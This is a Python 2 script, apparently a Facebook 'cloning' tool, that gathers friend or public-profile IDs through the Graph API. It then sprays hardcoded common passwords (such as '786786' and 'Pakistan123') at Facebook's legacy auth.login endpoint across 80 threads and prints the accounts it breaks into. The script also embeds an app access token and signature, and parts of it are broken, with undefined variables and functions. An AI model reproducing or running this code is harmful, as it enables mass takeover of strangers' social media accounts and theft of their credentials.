#!/usr/bin/python2
#coding=utf-8
#Codded By Rudra Singh 
#Editing My Script Will Not Make You A Coder
#Facebook : Rudra Singh 
#Whatsapp : +916386165988
#Pakistan Cyber Expert
#Alone Coder 
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')] 

def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
##### INTRO #####
logo ="""

████████████████████████████████
█▄─▄▄▀█▄─██─▄█▄─▄▄▀█▄─▄▄▀██▀▄─██
██─▄─▄██─██─███─██─██─▄─▄██─▀─██
▀▄▄▀▄▄▀▀▄▄▄▄▀▀▄▄▄▄▀▀▄▄▀▄▄▀▄▄▀▄▄▀
\033[1;97m-----------------------------------------------\n
➣  Coded By : Rudra Singh 
➣  YouTube  : Rudra SinghTechnical
➣  Github   : https://github.com/rudra
➣  Whatsapp : +916386165988
-----------------------------------------------"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
os.system("clear")
print logo

CorrectUsername = "king"
CorrectPassword = "king"

loop = 'true'
while (loop == 'true'):
    username = raw_input("[+] TOOL USERNAME: ")
    if (username == CorrectUsername):
    	password = raw_input("[+] TOOL PASSWORD: ")
        if (password == CorrectPassword):
            print "[✔] TOOL LOGGED IN SUCCESSFULLY "#Dev:Rudra_Singh
	    time.sleep(1)
            loop = 'false'
        else:
            print "\033[1;97mACCESS DENIED"
            os.system('xdg-open https://youtube.com/@RudraYt140?si=WKgBZo7sLetD20vO')
    else:
        print "\033[1;97mACCESS DENIED"
        os.system('xdg-open https://youtube.com/@RudraYt140?si=WKgBZo7sLetD20vO')
def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		jalan('\033[1;97m[1] \033[1;97mWarning: \033[1;97mUse a New Account To Login')
		jalan('\033[1;97m[2] \033[1;97mWarning: \033[1;97mRudra Singh King Of Facebook') 
		
		print('----------------------------------')
		print('[+] Login Your Facebook Account Here')
		print('----------------------------------')
		id = raw_input('[+] ID/NUMBER: ')
		pwd = raw_input('[+] PASSWORD: ')
		print"[✓] LOGGED IN SUCCESSFULLY "#Dev:Rudra_Singh
	print logo
	print "[✔] Name : "+nama
	print "[✔] ID   : "+id
	print "--------------------------------------------"
	print"[1] Start Cloning."
	print"[2] Update."
	print"[3] Logout."
        hop()
    
    
    
    
def hop():
	hack = raw_input("\n\033[1;97mChoose Option ≻ \033[1;97m")
	if hack =="":
		print "\x1b[1;97mFill in correctly"
		hop()
	elif hack =="1":
		super()
	elif hack =="2":
	        os.system('git pull origin master')
	        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        
	elif hack =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		exit()
	else:
		print "\x1b[1;97mFill in correctly"
		hop()
def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;97mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "[1] Clone From Friend List."
	print "[2] Clone From Public ID."
	print "[3] Back."
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;97mChoose Option ≻ \033[1;97m")
	if peak =="":
		print "\x1b[1;97mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;97m Please Wait"
		jalan('\033[1;97m[✔] Getting IDs \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;97m≻\033[1;97mInput ID\033[1;37m: \033[1;97m")
		
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97m[✔] Name\033[1;97m:\033[1;97m "+op["name"]
		except KeyError:
			print"\x1b[1;97mID Not Found!"
			raw_input("\n\033[1;97m[\033[1;97mBack\033[1;97m]")
			super()
		print"\033[1;97m[✔] Getting IDs..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
        
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;97mFill in correctly"
		pilih_super()
	
	print "\033[1;97m[✔] Total Friends \033[1;97m: \033[1;97m"+str(len(id))
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m[✔] Cloning Started\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
        print"""
[!] To Stop Process Press CTRL Then Z

---------------------------------------------------"""		
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Rudra:singh
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = '786786'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;97m|\x1b[1;32m ' + pass1
				oks.append(user+pass1)
			else:
                                pass2 = '000786'
                                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                q = json.load(data)
                                if 'access_token' in q:
                                        print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;97m|\x1b[1;32m ' + pass2
                                        oks.append(user+pass2)
                                else:
                                        pass3 = 'Pakistan'
                                        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                        q = json.load(data)
                                        if 'access_token' in q:
                                                print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;97m|\x1b[1;32m ' + pass3
                                                oks.append(user+pass3)
                                        else:
						a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
                                                b = json.loads(a.text)
                                                pass4 = 'Pakistan123'
                                                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                q = json.load(data)
                                                if 'access_token' in q:
                                                        print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;97m|\x1b[1;32m ' + pass4
                                                        oks.append(user+pass4)
																	
															
		except:
			pass
		
	p = ThreadPool(80)
	p.map(main, id)
	print "\033[1;97m---------------------------------------------------"
	
	print '\033[1;97mProcess Has Been Completed.'
	print"\033[1;97m-----------------"
	print"\033[1;97mTotal OK/\x1b[1;97mCP \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;97m"+str(len(cekpoint))
	print "\033[1;97m---------------------------------------------------"
	
	
	raw_input("\n\033[1;93m[\033[1;96mBack\033[1;93m]")
	menu()

if __name__ == '__main__':
	login()
